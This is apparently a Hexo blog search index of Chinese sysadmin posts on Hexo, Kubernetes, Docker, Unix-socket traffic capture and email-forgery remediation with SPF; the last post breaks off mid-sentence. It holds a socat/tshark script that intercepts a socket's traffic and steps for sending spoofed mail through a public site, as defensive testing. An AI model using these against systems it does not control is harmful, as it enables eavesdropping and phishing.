<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Hexo错误&quot;expected end of comment, got end of file&quot;</title>
      <link href="/2018/06/05/hexo-generate-error/"/>
      <url>/2018/06/05/hexo-generate-error/</url>
      <content type="html"><![CDATA[<p>##问题<br>使用hexo generate命令时报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">INFO  Start processing</span><br><span class="line">FATAL Something&apos;s wrong. Maybe you can find the solution here: http://hexo.io/docs/troubleshooting.html</span><br><span class="line">Template render error: Error: expected end of comment, got end of file</span><br><span class="line">    at Object._prettifyError (/web/hexo/node_modules/nunjucks/src/lib.js:35:11)</span><br><span class="line">    at Template.render (/web/hexo/node_modules/nunjucks/src/environment.js:526:21)</span><br><span class="line">    at Environment.renderString (/web/hexo/node_modules/nunjucks/src/environment.js:364:17)</span><br><span class="line">    at /web/hexo/node_modules/hexo/lib/extend/tag.js:66:9</span><br><span class="line">    at Promise._execute(/web/hexo/node_modules/bluebird/js/release/debuggability.js:303:9)</span><br><span class="line">    at Promise._resolveFromExecutor (/web/hexo/node_modules/bluebird/js/release/promise.js:483:18)</span><br><span class="line">    at new Promise (/web/hexo/node_modules/bluebird/js/release/promise.js:79:10)</span><br><span class="line">    at Tag.render (/web/hexo/node_modules/hexo/lib/extend/tag.js:64:10)</span><br><span class="line">    at Object.tagFilter [as onRenderEnd] (/web/hexo/node_modules/hexo/lib/hexo/post.js:266:16)</span><br><span class="line">    at /web/hexo/node_modules/hexo/lib/hexo/render.js:65:19</span><br><span class="line">    at tryCatcher (/web/hexo/node_modules/bluebird/js/release/util.js:16:23)</span><br><span class="line">    at Promise._settlePromiseFromHandler (/web/hexo/node_modules/bluebird/js/release/promise.js:512:31)</span><br><span class="line">    at Promise._settlePromise (/web/hexo/node_modules/bluebird/js/release/promise.js:569:18)</span><br><span class="line">    at Promise._settlePromise0 (/web/hexo/node_modules/bluebird/js/release/promise.js:614:10)</span><br><span class="line">    at Promise._settlePromises (/web/hexo/node_modules/bluebird/js/release/promise.js:693:18)</span><br><span class="line">    at Async._drainQueue (/web/hexo/node_modules/bluebird/js/release/async.js:133:16)</span><br><span class="line">    at Async._drainQueues (/web/hexo/node_modules/bluebird/js/release/async.js:143:10)</span><br><span class="line">    at Immediate.Async.drainQueues [as _onImmediate] (/web/hexo/node_modules/bluebird/js/release/async.js:17:14)</span><br><span class="line">    at runCallback (timers.js:794:20)</span><br><span class="line">    at tryOnImmediate (timers.js:752:5)</span><br><span class="line">    at processImmediate [as _immediateCallback] (timers.js:729:5)</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">##原因与解决方案</span><br><span class="line">hexo中&#123;#属于保留字段，&#123;#......#&#125;之间的内容属于注释字段，而shell中刚好出现了这个字段，导致渲染失败，</span><br><span class="line">**解决方案**</span><br><span class="line">把代码外的 &#123;#修改掉</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> github-pages </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>unix sock dump方法</title>
      <link href="/2018/04/19/unix-sock-dump-e6-96-b9-e6-b3-95/"/>
      <url>/2018/04/19/unix-sock-dump-e6-96-b9-e6-b3-95/</url>
      <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># Parameters</span><br><span class="line">socket=&quot;/run/foo.sock&quot;</span><br><span class="line">dump=&quot;/tmp/capture.pcap&quot;</span><br><span class="line"></span><br><span class="line"># Extract repetition</span><br><span class="line">port=9876</span><br><span class="line">source_socket=&quot;$(dirname &quot;$&#123;socket&#125;&quot;)/$(basename &quot;$&#123;socket&#125;&quot;).orig&quot;</span><br><span class="line"></span><br><span class="line"># Move socket files</span><br><span class="line">mv &quot;$&#123;socket&#125;&quot; &quot;$&#123;source_socket&#125;&quot;</span><br><span class="line">trap &quot;&#123; rm &apos;$&#123;socket&#125;&apos;; mv &apos;$&#123;source_socket&#125;&apos; &apos;$&#123;socket&#125;&apos;; &#125;&quot; EXIT</span><br><span class="line"></span><br><span class="line"># Setup pipe over TCP that we can tap into</span><br><span class="line">socat -t100 &quot;TCP-LISTEN:$&#123;port&#125;,reuseaddr,fork&quot; &quot;UNIX-CONNECT:$&#123;source_socket&#125;&quot; &amp;</span><br><span class="line">socat -t100 &quot;UNIX-LISTEN:$&#123;socket&#125;,mode=777,reuseaddr,fork&quot; &quot;TCP:localhost:$&#123;port&#125;&quot; &amp;</span><br><span class="line"></span><br><span class="line"># Record traffic</span><br><span class="line">tshark -i lo -w &quot;$&#123;dump&#125;&quot; -F pcapng &quot;dst port $&#123;port&#125; or src port $&#123;port&#125;&quot;</span><br></pre></td></tr></table></figure><p>如php-fpm的抓包可参考 <a href="https://forum.ivorde.com/freebsd-how-to-sniff-a-unix-socket-using-socat-utility-t15931.html" target="_blank" rel="noopener">https://forum.ivorde.com/freebsd-how-to-sniff-a-unix-socket-using-socat-utility-t15931.html</a></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ubuntu用kubeadm快速搭建kubernetes环境</title>
      <link href="/2018/04/16/ubuntu-e7-94-a8kubeadm-e5-bf-ab-e9-80-9f-e6-90-ad-e5-bb-bakubernetes-e7-8e-af-e5-a2-83/"/>
      <url>/2018/04/16/ubuntu-e7-94-a8kubeadm-e5-bf-ab-e9-80-9f-e6-90-ad-e5-bb-bakubernetes-e7-8e-af-e5-a2-83/</url>
      <content type="html"><![CDATA[<h2 id="step1-安装相应软件"><a href="#step1-安装相应软件" class="headerlink" title="step1:安装相应软件"></a>step1:安装相应软件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y curl apt-transport-https</span><br><span class="line">curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add -</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;EOF &gt;/etc/apt/sources.list.d/kubernetes.list</span><br><span class="line">deb http://apt.kubernetes.io/ kubernetes-xenial main</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line">\#如果没有安装docker的需要先安装docker，我用官网最新版本的docker遇到版本不匹配的情况，所以还是按照官方教程做比较好</span><br><span class="line">apt-get install -y docker.io</span><br><span class="line"></span><br><span class="line">apt-get install -y kubelet kubeadm kubectl kubernetes-cni</span><br></pre></td></tr></table></figure><h2 id="step2：使用kubeadm-初始化-kubernetes-集群"><a href="#step2：使用kubeadm-初始化-kubernetes-集群" class="headerlink" title="step2：使用kubeadm 初始化 kubernetes 集群"></a>step2：使用kubeadm 初始化 kubernetes 集群</h2><p>kubeadm init  –pod-network-cidr=10.244.0.0/16</p><p>这个时候，kubeadm会初始化各种环境配置，包括部署证书（private ca）和密钥，然后调用docker pull相应的镜像 以下是log输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[kubeadm] WARNING: kubeadm is in beta, please do not use it for production clusters.</span><br><span class="line">[init] Using Kubernetes version: v1.6.6</span><br><span class="line">[init] Using Authorization modes: [RBAC]</span><br><span class="line">[preflight] Running pre-flight checks</span><br><span class="line">[certificates] Generated CA certificate and key.</span><br><span class="line">[certificates] Generated API server certificate and key.</span><br><span class="line">[certificates] API Server serving cert is signed for DNS names [c-pc kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local] and IPs [10.96.0.1 192.168.217.135]</span><br><span class="line">[certificates] Generated API server kubelet client certificate and key.</span><br><span class="line">[certificates] Generated service account token signing key and public key.</span><br><span class="line">[certificates] Generated front-proxy CA certificate and key.</span><br><span class="line">[certificates] Generated front-proxy client certificate and key.</span><br><span class="line">[certificates] Valid certificates and keys now exist in &quot;/etc/kubernetes/pki&quot;</span><br><span class="line">[kubeconfig] Wrote KubeConfig file to disk: &quot;/etc/kubernetes/admin.conf&quot;</span><br><span class="line">[kubeconfig] Wrote KubeConfig file to disk: &quot;/etc/kubernetes/kubelet.conf&quot;</span><br><span class="line">[kubeconfig] Wrote KubeConfig file to disk: &quot;/etc/kubernetes/controller-manager.conf&quot;</span><br><span class="line">[kubeconfig] Wrote KubeConfig file to disk: &quot;/etc/kubernetes/scheduler.conf&quot;</span><br><span class="line">[apiclient] Created API client, waiting for the control plane to become ready</span><br><span class="line">[apiclient] All control plane components are healthy after 710.502147 seconds</span><br><span class="line">[token] Using token: c64554.15b62d72ae89cbb3</span><br><span class="line">[apiconfig] Created RBAC rules</span><br><span class="line">[addons] Applied essential addon: kube-proxy</span><br><span class="line">[addons] Applied essential addon: kube-dns</span><br><span class="line"></span><br><span class="line">Your Kubernetes master has initialized successfully!</span><br><span class="line"></span><br><span class="line">To start using your cluster, you need to run (as a regular user):</span><br><span class="line"></span><br><span class="line">  mkdir -p $HOME/.kube</span><br><span class="line">  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">  sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br><span class="line"></span><br><span class="line">You should now deploy a pod network to the cluster.</span><br><span class="line">Run &quot;kubectl apply -f [podnetwork].yaml&quot; with one of the options listed at:</span><br><span class="line">  http://kubernetes.io/docs/admin/addons/</span><br><span class="line"></span><br><span class="line">You can now join any number of machines by running the following on each node</span><br><span class="line">as root:</span><br><span class="line"></span><br><span class="line">  kubeadm join --token c64554.15b62d72ae89cbb3 192.168.217.135:6443</span><br></pre></td></tr></table></figure></p><p>提示：在log看到这句输出的时候，docker就开始pull对应的镜像，比较耗时，耗时取决于你的网速 [apiclient] Created API client, waiting for the control plane to become ready pull完镜像后，可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@c-pc:~# docker images</span><br><span class="line">REPOSITORY                                               TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">gcr.io/google_containers/kube-proxy-amd64                v1.6.6              b01133efa4f0        2 weeks ago         109 MB</span><br><span class="line">gcr.io/google_containers/kube-controller-manager-amd64   v1.6.6              a1b8bfeff845        2 weeks ago         132.9 MB</span><br><span class="line">gcr.io/google_containers/kube-apiserver-amd64            v1.6.6              eaedf2552acd        2 weeks ago         150.7 MB</span><br><span class="line">gcr.io/google_containers/kube-scheduler-amd64            v1.6.6              b662c4a72c62        2 weeks ago         76.75 MB</span><br><span class="line">gcr.io/google_containers/etcd-amd64                      3.0.17              243830dae7dd        4 months ago        168.9 MB</span><br><span class="line">gcr.io/google_containers/pause-amd64                     3.0                 99e59f495ffa        14 months ago       746.9 kB</span><br></pre></td></tr></table></figure></p><p>kubectl查看node和pod的状态 根据log提示，需要配置kubectl的配置， 初始化kubectl配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure></p><p>需要先执行以上操作，否则会遇到以下错误提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c-pc:~# kubectl get nodes</span><br><span class="line">The connection to the server localhost:8080 was refused - did you specify the right host or port?</span><br></pre></td></tr></table></figure></p><p>最新的kubectl链接api server不是通过8080端口连接的，而是通过6443端口，可以在admin.conf查看</p><p>…<br>server: <a href="https://192.168.217.135:6443" target="_blank" rel="noopener">https://192.168.217.135:6443</a><br>…</p><p>初始化kubectl配置之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@c-pc:~# kubectl get nodes</span><br><span class="line">The connection to the server localhost:8080 was refused - did you specify the right host or port?</span><br><span class="line">root@c-pc:~# mkdir -p $HOME/.kube</span><br><span class="line">root@c-pc:~# cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">root@c-pc:~# chown $(id -u):$(id -g) $HOME/.kube/config</span><br><span class="line">root@c-pc:~# kubectl get nodes</span><br><span class="line">NAME      STATUS     AGE       VERSION</span><br><span class="line">c-pc      NotReady   3h        v1.7.0</span><br></pre></td></tr></table></figure></p><p>居然是NotReady状态！！ 查看以下pods的状态，发现kube-dns 还在挂起，怪不得docker images的时候没有发现kube-dns镜像<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@c-pc:~# kubectl get pods --all-namespaces</span><br><span class="line">NAMESPACE     NAME                           READY     STATUS    RESTARTS   AGE</span><br><span class="line">kube-system   etcd-c-pc                      1/1       Running   0          3h</span><br><span class="line">kube-system   kube-apiserver-c-pc            1/1       Running   0          3h</span><br><span class="line">kube-system   kube-controller-manager-c-pc   1/1       Running   0          3h</span><br><span class="line">kube-system   kube-dns-2838158301-v0srq      0/3       Pending   0          3h</span><br><span class="line">kube-system   kube-proxy-ql2g0               1/1       Running   0          3h</span><br><span class="line">kube-system   kube-scheduler-c-pc            1/1       Running   0          3h</span><br></pre></td></tr></table></figure></p><p>按照官网教程，需要配置pod的网络，这里使用了flannel网络，依次执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f https://github.com/coreos/flannel/raw/master/Documentation/k8s-manifests/kube-flannel-rbac.yml</span><br><span class="line"></span><br><span class="line">kubectl create -f  https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br></pre></td></tr></table></figure></p><p>查看以下pods的状态<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@c-pc:~# kubectl get pods --all-namespaces</span><br><span class="line">NAMESPACE     NAME                           READY     STATUS              RESTARTS   AGE</span><br><span class="line">kube-system   etcd-c-pc                      1/1       Running             0          3h</span><br><span class="line">kube-system   kube-apiserver-c-pc            1/1       Running             0          3h</span><br><span class="line">kube-system   kube-controller-manager-c-pc   1/1       Running             0          3h</span><br><span class="line">kube-system   kube-dns-2838158301-v0srq      0/3       Pending             0          3h</span><br><span class="line">kube-system   kube-flannel-ds-vp7mt          0/2       ContainerCreating   0          12s</span><br><span class="line">kube-system   kube-proxy-ql2g0               1/1       Running             0          3h</span><br><span class="line">kube-system   kube-scheduler-c-pc            1/1       Running             0          3h</span><br></pre></td></tr></table></figure></p><p>这个时候开始创建pull flannel的image了，稍等一下，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@c-pc:~# kubectl get nodes</span><br><span class="line">NAME      STATUS    AGE       VERSION</span><br><span class="line">c-pc      Ready     3h        v1.7.0</span><br><span class="line">root@c-pc:~# kubectl get pods --all-namespaces</span><br><span class="line">NAMESPACE     NAME                           READY     STATUS    RESTARTS   AGE</span><br><span class="line">kube-system   etcd-c-pc                      1/1       Running   0          3h</span><br><span class="line">kube-system   kube-apiserver-c-pc            1/1       Running   0          3h</span><br><span class="line">kube-system   kube-controller-manager-c-pc   1/1       Running   0          3h</span><br><span class="line">kube-system   kube-dns-2838158301-v0srq      3/3       Running   0          3h</span><br><span class="line">kube-system   kube-flannel-ds-vp7mt          2/2       Running   0          6m</span><br><span class="line">kube-system   kube-proxy-ql2g0               1/1       Running   0          3h</span><br><span class="line">kube-system   kube-scheduler-c-pc            1/1       Running   0          3h</span><br></pre></td></tr></table></figure></p><p>node的状态变成ready，good！ 在另外一台机器上 kubeadm join –token c64554.15b62d72ae89cbb3 192.168.217.135:6443 在master主机上可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c-pc:~# kubectl get nodes</span><br><span class="line">NAME      STATUS    AGE       VERSION</span><br><span class="line">c-pc      Ready     4h        v1.7.0</span><br><span class="line">c-pc2     Ready     27s       v1.7.0</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>docker更换源</title>
      <link href="/2018/04/16/docker-e6-9b-b4-e6-8d-a2-e6-ba-90/"/>
      <url>/2018/04/16/docker-e6-9b-b4-e6-8d-a2-e6-ba-90/</url>
      <content type="html"><![CDATA[<p>通过 Docker 官方镜像加速，中国区用户能够快速访问最流行的 Docker 镜像。该镜像托管于中国大陆，本地用户现在将会享受到更快的下载速度和更强的稳定性，从而能够更敏捷地开发和交付 Docker 化应用。 Docker 中国官方镜像加速可通过 registry.docker-cn.com 访问。该镜像库只包含流行的公有镜像。私有镜像仍需要从美国镜像库中拉取。 您可以使用以下命令直接从该镜像加速地址进行拉取：</p><pre><code>$ docker pull registry.docker-cn.com/myname/myrepo:mytag</code></pre><p>例如:</p><pre><code>$ docker pull registry.docker-cn.com/library/ubuntu:16.04</code></pre><blockquote><p><strong>注</strong>: 除非您修改了 Docker 守护进程的 <code>`--registry-mirror`</code> 参数 (见下文), 否则您将需要完整地指定官方镜像的名称。例如，library/ubuntu、library/redis、library/nginx。</p></blockquote><h4 id="使用-–registry-mirror-配置-Docker-守护进程"><a href="#使用-–registry-mirror-配置-Docker-守护进程" class="headerlink" title="使用 –registry-mirror 配置 Docker 守护进程"></a>使用 –registry-mirror 配置 Docker 守护进程</h4><p>您可以配置 Docker 守护进程默认使用 Docker 官方镜像加速。这样您可以默认通过官方镜像加速拉取镜像，而无需在每次拉取时指定 registry.docker-cn.com。 您可以在 Docker 守护进程启动时传入 <code>--registry-mirror</code> 参数：</p><pre><code>$ docker --registry-mirror=https://registry.docker-cn.com daemon</code></pre><p>为了永久性保留更改，您可以修改 <code>/etc/docker/daemon.json</code> 文件并添加上 registry-mirrors 键值。</p><pre><code>{  &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;]}</code></pre><p>修改保存后重启 Docker 以使配置生效。</p><blockquote><p><strong>注</strong>: 您也可以使用适用于 Mac 的 Docker 和适用于 Windows 的 Docker 来进行设置。</p></blockquote>]]></content>
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>解决docker删除container出现device or resource busy</title>
      <link href="/2018/04/02/e8-a7-a3-e5-86-b3docker-e5-88-a0-e9-99-a4container-e5-87-ba-e7-8e-b0device-or-resource-busy/"/>
      <url>/2018/04/02/e8-a7-a3-e5-86-b3docker-e5-88-a0-e9-99-a4container-e5-87-ba-e7-8e-b0device-or-resource-busy/</url>
      <content type="html"><![CDATA[<h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>基本环境是CentOS7.3<br>kernel version：3.10.0-514.el7.x86_64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">**docker info**: </span><br><span class="line">Containers: 10 </span><br><span class="line">Running: 10 </span><br><span class="line">Paused: 0 </span><br><span class="line">Stopped: 0 </span><br><span class="line">Images: 31 </span><br><span class="line">Server Version: 17.12.0-ce </span><br><span class="line">Storage Driver: overlay2 </span><br><span class="line">Backing Filesystem: xfs Supports </span><br><span class="line">d_type: true </span><br><span class="line">Native Overlay Diff: false </span><br><span class="line">Logging Driver: json-file </span><br><span class="line">Cgroup Driver: cgroupfs </span><br><span class="line">Plugins: </span><br><span class="line">Volume: local </span><br><span class="line">Network: bridge host macvlan null overlay </span><br><span class="line">Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog </span><br><span class="line">Swarm: inactive </span><br><span class="line">Runtimes: runc </span><br><span class="line">Default Runtime: runc </span><br><span class="line">Init Binary: docker-init </span><br><span class="line">containerd version: 89623f28b87a6004d4b785663257362d1658a729 </span><br><span class="line">runc version: b2567b37d7b75eb4cf325b77297b140ea686ce8f </span><br><span class="line">init version: 949e6fa </span><br><span class="line">Security Options: seccomp </span><br><span class="line">Profile: default </span><br><span class="line">Kernel Version: 3.10.0-514.el7.x86\_64 </span><br><span class="line">Operating System: CentOS Linux 7 (Core) </span><br><span class="line">OSType: linux </span><br><span class="line">Architecture: x86_64 </span><br><span class="line">CPUs: 40 </span><br><span class="line">Total Memory: 31.15GiB </span><br><span class="line">Name: web-130.fof.lczq.com </span><br><span class="line">ID: JBM5:LNHC:TWFW:XJHW:P7SA:6KCE:HT23:HAFE:EWC3:TWBJ:XOZK:PNG5 </span><br><span class="line">Docker Root Dir: /data1/docker </span><br><span class="line">Debug Mode (client): false </span><br><span class="line">Debug Mode (server): false </span><br><span class="line">Registry: [https://index.docker.io/v1/](https://index.docker.io/v1/) </span><br><span class="line">Labels: Experimental: false </span><br><span class="line">Insecure Registries: 127.0.0.0/8 </span><br><span class="line">Registry Mirrors: [https://wmsl2uyx.mirror.aliyuncs.com/](https://wmsl2uyx.mirror.aliyuncs.com/) </span><br><span class="line">Live Restore Enabled: false</span><br></pre></td></tr></table></figure></p><p>服务器因为电源问题自动关机，重启以后发现有的container不能被删除。</p><p>docker-compose down</p><p>报错：<br>Error response from daemon: driver “overlay” failed to remove root filesystem for <some-id>:<br>remove /data1/docker/overlay/<some-id>/merged: device or resource busy</some-id></some-id></p><h2 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h2><p>经过排查发现是:/data1/docker/overlay//merged 是空的，但是无法删除。手动rm也会报”device or resouce busy” 尝试过重启docker，但是问题依旧。即使将docker stop，也无法删除目录。 查看mount信息，也没有发现任何挂载信息。 在docker的service里增加了</p><p>[Service]<br># MountFlags “slave” helps to prevent “device busy” errors on RHEL/CentOS 7.3 kernels<br>MountFlags=slave</p><p>也没有解决</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>通过fuser和lsof都找不到正在使用这一个文件的进程. 最后通过搜索，发现可以通过查看进程的mountinfo来查找占用目录的进程。</p><p>grep <some-id> /proc/*/mountinfo</some-id></p><p>一般通过查找可以找到PID。 根据这个PID发现是一个/usr/libexec/colord的程序在使用。 查了一下程序的信息，发现确实是将之前删除不了的目录写在了mountinfo中。 找到进程就好办了。直接将这个进程kill掉。 重新执行docker-compose down，提示删除成功。 参考： <a href="https://github.com/moby/moby/issues/22260" target="_blank" rel="noopener">https://github.com/moby/moby/issues/22260</a> <a href="http://blog.51cto.com/nosmoking/1958730" target="_blank" rel="noopener">http://blog.51cto.com/nosmoking/1958730</a> <a href="http://blog.terminus.io/docker-device-is-busy/" target="_blank" rel="noopener">http://blog.terminus.io/docker-device-is-busy/</a></p>]]></content>
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>任意邮箱伪造漏洞处理</title>
      <link href="/2018/03/29/e4-bb-bb-e6-84-8f-e9-82-ae-e7-ae-b1-e4-bc-aa-e9-80-a0-e6-bc-8f-e6-b4-9e-e5-a4-84-e7-90-86/"/>
      <url>/2018/03/29/e4-bb-bb-e6-84-8f-e9-82-ae-e7-ae-b1-e4-bc-aa-e9-80-a0-e6-bc-8f-e6-b4-9e-e5-a4-84-e7-90-86/</url>
      <content type="html"><![CDATA[<p>阿里的四叶草安全感洞检测出有任意邮箱伪造漏洞，处理如下： 首先，如何验证邮件伪造？<br>​ 解决对邮件伪造的疑惑，这里有一个在线的测试网站：<a href="https://emkei.cz/" target="_blank" rel="noopener">https://emkei.cz/</a> 。可以尝试使用这个网站测试发送一封邮件给自己。例如：检测说a.com存在邮件伪造漏洞。那么我们可以尝试使用<a href="mailto:admin@a.com" target="_blank" rel="noopener">admin@a.com</a>作为发件人，给一个自己的邮箱，例如我的treeoph(at)gmail(dot)com发送一封测试邮件。内容随意填写，不到一分钟你应该就能收到邮件了，也有可能会在垃圾邮件里。注意，请勿用于非法用途。</p><p>第二，有什么危害？<br>​ 可以想见如果有一个a.com的用户，在收到<a href="mailto:admin@a.com" target="_blank" rel="noopener">admin@a.com</a> 的邮件后，用户很可能就相信这就是管理员（admin）发来的邮件。因此，用户很可能会毫不犹豫地点开邮件中的链接、下载并打开其中的附件。这个时候，作为一个a.com的用户，就很可能被攻击控制了。如果用户是管理员，那么可能服务器权限也会沦落他人之手。</p><p>​ 另外一种危害方式，一个垃圾邮件生产者可以伪造海量的a.com域名的邮件来散播木马、病毒、钓鱼页面，色情、暴力、恐怖的信息，等等。其危害是不可预测的。</p><p>第三，如何防止邮件伪造？<br>​ 答案是：Sender PolicyFramework (SPF) 发信者策略</p><ol><li>SPF是什么呢？<br>​ 简单来说就是人们设计的一套可以杜绝邮件伪造的机制，只要遵照他们设计的方法来配置自己域名的DNS解析，就可以杜绝邮件伪造。</li></ol><p>​ 关于SPF的一切，你可以在这个网站（英文）上获得：<a href="http://www.openspf.org" target="_blank" rel="noopener">http://www.openspf.org</a></p><p>​ SPF 的原理是这样的，伪造这虽然能伪造你的域名，但是却不能控制你的域名的DNS解析记录。因为只有拥有域名账户权限，才能更改解析记录。你的域名解析到的ip是1.1.1.1，而伪造者的ip是2.2.2.2。如果能做一个声明，告诉邮件接收者，我的域名发的邮件ip都是1.1.1.1，其他的都是假的，可以抛弃掉，那么就可以杜绝邮件伪造了。SPF就是这样的一个协议，你可以按照SPF的格式发出声明，邮件服务器按照SPF解读你的声明。这样的一次沟通，就可以解决邮件伪造问题了。</p><ol start="2"><li>如何使用SPF？<br>​ 